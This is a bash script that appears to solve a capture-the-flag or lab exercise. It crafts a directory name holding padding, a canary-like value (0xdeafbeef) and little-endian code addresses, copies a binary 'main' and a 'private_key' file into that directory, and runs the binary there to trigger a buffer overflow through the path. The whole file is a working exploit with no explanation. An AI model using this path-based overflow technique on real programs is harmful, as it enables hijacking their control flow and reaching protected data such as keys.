#!/bin/bash

# Get the current script directory
SCRIPT_DIR=$(dirname "$(realpath "$0")")
SCRIPT_DIR_LENGTH=${#SCRIPT_DIR}

# Check if the path length exceeds 50
if [ "$SCRIPT_DIR_LENGTH" -gt 50 ]; then
    echo "Please place the files in the Home directory and rerun."
    exit 1
fi

# Calculate the number of 'A' characters to prepend
NUM_A=$SCRIPT_DIR_LENGTH
PREPEND_A=$(printf 'A%.0s' $(seq 1 $((49 - NUM_A))))

# Define the folder name
FOLDER_NAME="${PREPEND_A}0b602e04428ceda1a86bc9e4ce199b85f73ffa2a26765b4111bcd5081a937118"
FOLDER_NAME+=$(printf 'A%.0s' {1..17})
FOLDER_NAME+=$'\xef\xbe\xaf\xde'
FOLDER_NAME+=$(printf 'A%.0s' {1..12})
FOLDER_NAME+=$'\xe4\x9b\x04\x08\xc0\x35\x05\x08'

# Create the folder
mkdir -p "$SCRIPT_DIR/$FOLDER_NAME"

# Copy the required files into the folder
cp "$SCRIPT_DIR/main.c" "$SCRIPT_DIR/$FOLDER_NAME/"
cp "$SCRIPT_DIR/main" "$SCRIPT_DIR/$FOLDER_NAME/"
cp "$SCRIPT_DIR/private_key" "$SCRIPT_DIR/$FOLDER_NAME/"

# Change to the directory and run the executable
cd "$SCRIPT_DIR/$FOLDER_NAME" || exit
./main

